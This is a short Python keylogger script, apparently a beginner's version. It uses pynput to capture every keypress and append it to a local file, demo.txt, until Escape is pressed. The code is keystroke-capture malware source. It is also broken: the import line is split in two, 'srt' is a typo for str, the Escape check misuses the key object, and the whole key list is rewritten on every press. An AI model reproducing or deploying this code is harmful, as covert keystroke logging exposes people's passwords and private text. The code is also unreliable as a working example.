from pynput.keyboard 
import Key, Listener

k = []
def on_press(key):
  k.append(key)
  write_1(k)
  print(key)

def write_1(var):
  with open("demo.txt", "a") as d:
    for i in var :
      new_var = srt(i).replace("'" , " ")
      d.write(new_var)
      d.write(" ")

def on_release(key):
  if key == key.esc:
    return False

with Listener(on_press= on_press, on_release= on_release) as l:
  l.join()
